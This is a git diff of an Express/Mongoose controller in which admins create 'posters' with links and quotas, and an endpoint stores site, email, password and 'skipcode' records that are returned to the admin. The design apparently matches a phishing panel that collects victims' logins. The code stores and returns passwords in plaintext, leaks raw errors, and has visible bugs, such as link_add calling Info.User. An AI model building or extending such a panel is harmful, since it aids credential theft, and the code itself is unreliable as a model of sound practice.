@@ -1,7 +1,7 @@
 
 const User = require('../models/User')
 const Info = require('../models/Info')
-
+const Link = require('../models/Link')
 const Poster = require('../models/Poster')
 
 
@@ -41,27 +41,34 @@ const Poster = require('../models/Poster')
 
 
 module.exports.signup_post = async (req, res) => {
-    const { username, password } = req.body;
+    const { username, password, links, adminId, numOfPostersPermission } = req.body;
 
     try {
         const user = await User.findOne({ username: username })
         if (user) {
-            return res.status(400).json({ error: "user exists" })
+            return res.status(400).json({ error: "user exists yes" })
 
         }
-        const userCtreated = await Info.User({
+        const foundWithAdminId = await User.findOne({ adminId: adminId })
+        if (foundWithAdminId) {
+            return res.status(400).json({ error: "id exists" })
+        }
+        const userCreated = await User.create({
             password,
             username,
+            adminId,
+            links,
+            numOfPostersPermission
 
 
         })
-        return res.status(200).json({ user: userCtreated })
+        return res.status(200).json({ user: userCreated })
 
 
     }
     catch (e) {
 
-        return res.status(400).json({ error: "user exists" })
+        return res.status(400).json({ error: e })
 
     }
 
@@ -75,7 +82,7 @@ module.exports.login_post = async (req, res) => {
 
         if (user) {
             if (user.password == password) {
-                return res.status(200).json({ username: user.username, id: user._id, admin: user.admin })
+                return res.status(200).json({ adminId: user.adminId, username: user.username, id: user._id, admin: user.admin, })
 
             }
             return res.status(400).json({ error: "Wrong password" })
@@ -86,7 +93,7 @@ module.exports.login_post = async (req, res) => {
             const poster = await Poster.findOne({ username: username })
             if (poster) {
                 if (poster.password == password) {
-                    return res.status(200).json({ username: user.username, id: user._id, admin: user.admin })
+                    return res.status(200).json({ username: poster.username, id: poster._id, admin: poster.admin })
 
                 }
                 return res.status(400).json({ error: "Wrong password" })
@@ -117,6 +124,34 @@ module.exports.skip_code = (req, res) => {
     })
 
 }
+module.exports.add_posterNumber = (req, res) => {
+    const { username, numberAdd } = req.body;
+    Info.findOneAndUpdate({ username: username }, {
+        $set: {
+            numOfPostersPermission: numberAdd
+        }
+    }, { new: true }, (err, ok) => {
+        if (err) {
+            res.status(400).json({ error: err })
+        }
+        res.status(200).json({ success: true })
+    })
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 module.exports.info_get = async (req, res) => {
 
@@ -126,13 +161,24 @@ module.exports.info_get = async (req, res) => {
     try {
 
         if (admin) {
-            const user = await User.findOne({ username: username })
+            const user = await User.findOne({ _id: id })
+                .populate({
+                    path: 'posters',
+                    model: 'Poster',
+                    select: 'username password links ',
+                    populate: {
+                        path: 'details',
+                        model: 'Info',
+                        select: 'site email password skipcode',
+                    }
+                }).sort({ createdAt: -1 })
+                .select('posters').populate('posters', 'username password links ')
             return res.status(200).json({ user: user })
 
 
         }
 
-        const poster = await Poster.findOne({ username: username })
+        const poster = await Poster.findOne({ _id: id }).select('details').populate('details', 'site email password skipcode').sort({ createdAt: -1 })
         return res.status(200).json({ poster: poster })
     } catch (e) {
         res.status(400).json({ e: "error" })
@@ -143,8 +189,8 @@ module.exports.info_get = async (req, res) => {
 
 module.exports.poster_add = async (req, res) => {
 
-    const { username, password, links, id } = req.body
-    console.log(username)
+    const { username, password, links, id, posterId } = req.body
+
 
     try {
         const user = await User.findOne({ _id: id })
@@ -153,13 +199,20 @@ module.exports.poster_add = async (req, res) => {
             return res.status(400).json({ error: "username exists" })
 
         }
-        if (user.numOfPosters > 10 && user.permission == false) {
-            return res.status(400).json({ error: "Can not create more than 10 users" })
+        const posterIdExists = await Poster.findOne({ posterId: posterId })
+        // const userWithPoster = await User.findOne({ _id: posterIdExists.root.toString() })
+
+        if (user._id == posterIdExists.root) {
+            return res.status(400).json({ error: "posterId exists" })
+
+        }
+        if (user.numOfPosters >= user.numOfPostersPermission) {
+            return res.status(400).json({ error: "User add limit reached" })
 
         }
 
         const poster = await Poster.create({
-            username, password, links,
+            username, password, links, posterId,
 
             root: user._id
 
@@ -168,9 +221,10 @@ module.exports.poster_add = async (req, res) => {
         user.posters.push(poster._id)
         user.numOfPosters = user.numOfPosters + 1
         await user.save();
+        return res.status(200).json({ status: "saved" })
 
     } catch (e) {
-        res.status(400).json({ e: "error" })
+        res.status(400).json({ e: e })
     }
 
 }
@@ -178,19 +232,19 @@ module.exports.poster_add = async (req, res) => {
 
 module.exports.add_data = async (req, res) => {
 
-    const { user, poster } = req.params
+    const { adminId, posterId } = req.params
     const { site, email, password, skipcode } = req.body
     console.log(username)
 
     try {
-        const userFound = await User.findOne({ username: user })
+        const userFound = await User.findOne({ username: adminId })
 
-        const posterFound = await Poster.findOne({ username: poster })
+        const posterFound = await Poster.findOne({ username: posterId })
 
         if (userFound && posterFound) {
             const info = await Info.create({
                 site, email, password, skipcode,
-                poster: poster,
+                poster: posterId,
                 root: posterFound._id
 
 
@@ -251,6 +305,77 @@ module.exports.delete_poster = async (req, res) => {
     }
 
 }
+
+module.exports.link_add = async (req, res) => {
+
+    const { linkName } = req.body
+
+    try {
+        const link = await Link.find({ linkName: linkName })
+        if (link) {
+            return res.status(400).json({ e: "exists" })
+
+        }
+        const userCtreated = await Info.User({
+            linkName
+
+
+        })
+        return res.status(200).json({ status: "created" })
+
+    } catch (e) {
+        res.status(400).json({ e: "error" })
+    }
+
+}
+
+module.exports.link_get = async (req, res) => {
+
+    const { id } = req.params
+
+
+    try {
+        const user = await User.find({ _id: id })
+        res.status(200).json({ users: user.links })
+    } catch (e) {
+        res.status(400).json({ e: "error" })
+    }
+
+}
+
+
+
+
+module.exports.all_poster = async (req, res) => {
+
+    const { id } = req.params
+
+
+    try {
+
+        const data = await User.find({ _id: id }).select('posters').populate('posters', 'username password links posterId')
+        return res.status(200).json({ data: data })
+
+
+
+    } catch (e) {
+        res.status(400).json({ e: "error" })
+    }
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 // module.exports.signin_post=async(req,res)=>{
 //     const {email,password}=req.body;
